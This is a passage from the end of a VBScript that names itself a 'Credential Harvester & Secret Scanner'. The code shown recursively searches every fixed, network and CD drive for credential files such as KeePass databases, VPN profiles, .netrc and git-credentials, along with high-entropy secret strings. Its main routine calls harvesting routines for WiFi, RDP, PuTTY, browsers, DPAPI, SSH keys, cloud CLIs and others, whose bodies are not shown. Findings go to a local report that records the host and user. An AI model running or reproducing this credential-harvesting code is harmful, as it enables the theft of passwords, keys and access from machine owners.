        "kdbx", "kdb", "ovpn", "pcf", "netrc", "npmrc", "gitconfig", "git-credentials" _
    )
End Sub

Function IsTargetExtension(ext)
    Dim i
    ext = LCase(ext)
    IsTargetExtension = False
    For i = 0 To UBound(g_ScanExts)
        If ext = g_ScanExts(i) Then IsTargetExtension = True : Exit Function
    Next
End Function

Sub ScanFolder(folder, depth, ByRef out)
    If depth > MAX_DEPTH Then Exit Sub
    If g_ScanStats(0) >= MAX_TOTAL_FILES Then Exit Sub
    On Error Resume Next

    ' Skip certain folders
    Dim skipDirs : skipDirs = Array("windows", "$recycle.bin", "system volume information", _
        "node_modules", ".git", "__pycache__", "temp", "tmp", "cache", "winsxs", _
        "assembly", "servicing", "installer", "logs", "log")
    Dim folderLow : folderLow = LCase(folder.Name)
    Dim sd
    For Each sd In skipDirs
        If folderLow = sd Then Exit Sub
    Next

    ' Scan files
    Dim f6
    For Each f6 In folder.Files
        If g_ScanStats(0) >= MAX_TOTAL_FILES Then Exit Sub
        Dim ext6 : ext6 = LCase(g_FSO.GetExtensionName(f6.Name))

        ' Also scan files without extension if small
        Dim shouldScan : shouldScan = False
        If IsTargetExtension(ext6) Then
            shouldScan = True
        ElseIf ext6 = "" And f6.Size < 32768 Then
            shouldScan = True
        End If

        If shouldScan And f6.Size > 0 And f6.Size <= MAX_FILE_SIZE Then
            g_ScanStats(0) = g_ScanStats(0) + 1
            g_ScanStats(1) = g_ScanStats(1) + f6.Size

            ' Skip binary
            If Not IsBinaryFile(f6.Path) Then
                Dim ts6, c6
                Set ts6 = g_FSO.OpenTextFile(f6.Path, 1)
                c6 = ts6.ReadAll : ts6.Close
                If Err.Number = 0 Then
                    Dim res : res = ScanContent(c6, f6.Path)
                    If res <> "" Then
                        out = out & "  [FILE] " & f6.Path & vbCrLf
                        out = out & res
                    End If

                    ' High entropy string detection on small files
                    If f6.Size < 8192 Then
                        Dim lines6, ln
                        lines6 = Split(c6, vbCrLf)
                        For Each ln In lines6
                            ln = Trim(ln)
                            If Len(ln) >= 20 And Len(ln) <= 256 Then
                                If CalcEntropy(ln) > 4.5 Then
                                    ' Check if it looks like a key=value
                                    If InStr(ln, "=") > 0 Or InStr(ln, ":") > 0 Then
                                        out = out & "  [FILE] " & f6.Path & vbCrLf
                                        Dim snip : snip = Left(ln, 60)
                                        out = out & "      [ENTROPY] " & FormatNumber(CalcEntropy(ln), 2) & " -> " & snip & "..." & vbCrLf
                                        g_ScanStats(2) = g_ScanStats(2) + 1
                                    End If
                                End If
                            End If
                        Next
                    End If
                Else
                    g_ScanStats(3) = g_ScanStats(3) + 1
                    Err.Clear
                End If
            Else
                g_ScanStats(3) = g_ScanStats(3) + 1
            End If
        End If
    Next

    ' Recurse subfolders
    Dim sub6
    For Each sub6 In folder.SubFolders
        ScanFolder sub6, depth + 1, out
    Next
End Sub

Function ScanAllDrives()
    Dim out, drv
    out = "=== [FULL DRIVE SECRET SCAN] ===" & vbCrLf
    For Each drv In g_FSO.Drives
        On Error Resume Next
        If drv.IsReady Then
            If drv.DriveType = 2 Or drv.DriveType = 3 Or drv.DriveType = 4 Then
                ' Fixed, Network, or CDROM
                out = out & "  [DRIVE] " & drv.DriveLetter & ": (" & drv.DriveType & ") " & drv.VolumeName & vbCrLf
                ScanFolder g_FSO.GetFolder(drv.DriveLetter & ":\"), 0, out
            End If
        End If
    Next
    out = out & vbCrLf & "  --- SCAN STATS ---" & vbCrLf
    out = out & "  Files scanned : " & g_ScanStats(0) & vbCrLf
    out = out & "  Bytes read    : " & g_ScanStats(1) & vbCrLf
    out = out & "  Hits found    : " & g_ScanStats(2) & vbCrLf
    out = out & "  Skipped       : " & g_ScanStats(3) & vbCrLf
    ScanAllDrives = out
End Function

' =========================================================
'  REPORT WRITER
' =========================================================

Sub WriteReport(content)
    Dim reportPath, ts7, scriptDir
    scriptDir = g_FSO.GetParentFolderName(WScript.ScriptFullName)
    reportPath = scriptDir & "\cred_report_" & _
                 Replace(Replace(Replace(Now, "/", "-"), ":", "-"), " ", "_") & ".txt"
    Set ts7 = g_FSO.CreateTextFile(reportPath, True)
    ts7.WriteLine "================================================================="
    ts7.WriteLine " CREDENTIAL HARVEST & SECRET SCAN REPORT"
    ts7.WriteLine " Generated: " & Now
    ts7.WriteLine " Host     : " & g_Net.ComputerName
    ts7.WriteLine " User     : " & g_Net.UserDomain & "\" & g_Net.UserName
    ts7.WriteLine "================================================================="
    ts7.WriteLine ""
    ts7.Write content
    ts7.WriteLine ""
    ts7.WriteLine "================================================================="
    ts7.WriteLine " ALL FINDINGS SUMMARY"
    ts7.WriteLine "================================================================="
    ts7.Write g_Findings
    ts7.Close
    WScript.Echo "[*] Report saved: " & reportPath
End Sub

' =========================================================
'  GLOBALS & MAIN
' =========================================================

Dim g_FSO, g_Shell, g_Net

Sub InitGlobals()
    Set g_FSO   = CreateObject("Scripting.FileSystemObject")
    Set g_Shell = CreateObject("WScript.Shell")
    Set g_Net   = CreateObject("WScript.Network")
End Sub

Sub Main()
    On Error Resume Next
    InitGlobals
    InitCredModule
    InitScanExtensions

    WScript.Echo "============================================="
    WScript.Echo " PureVBS Credential Harvester & Secret Scanner"
    WScript.Echo " " & Now
    WScript.Echo "============================================="
    WScript.Echo ""

    Dim report : report = ""

    ' Phase 1 — Targeted Harvesting
    WScript.Echo "[*] Phase 1: Targeted credential harvesting..."
    report = report & Harvest_WiFi()         & vbCrLf
    report = report & Harvest_RDP()          & vbCrLf
    report = report & Harvest_PuTTY()        & vbCrLf
    report = report & Harvest_WinSCP()       & vbCrLf
    report = report & Harvest_FileZilla()    & vbCrLf
    report = report & Harvest_Browsers()     & vbCrLf
    report = report & Harvest_Registry()     & vbCrLf
    report = report & Harvest_UnattendXML()  & vbCrLf
    report = report & Harvest_GPP()          & vbCrLf
    report = report & Harvest_PowerShellHistory() & vbCrLf
    report = report & Harvest_CredManager()  & vbCrLf
    report = report & Harvest_DPAPI()        & vbCrLf
    report = report & Harvest_SSH()          & vbCrLf
    report = report & Harvest_CloudCLI()     & vbCrLf
    report = report & Harvest_DotFiles()     & vbCrLf
    report = report & Harvest_IISConfig()    & vbCrLf
    report = report & Harvest_KeePass()      & vbCrLf

    WScript.Echo "[*] Phase 1 complete."

    ' Phase 2 — Full drive recursive scan
    WScript.Echo "[*] Phase 2: Recursive drive scan (patterns + entropy)..."
    report = report & ScanAllDrives() & vbCrLf

    WScript.Echo "[*] Phase 2 complete."

    ' Write report
    WScript.Echo "[*] Writing report..."
    WriteReport report

    WScript.Echo "[*] Total findings: " & g_ScanStats(2)
    WScript.Echo "[*] Done."
End Sub

' --- Entry point ---
Main
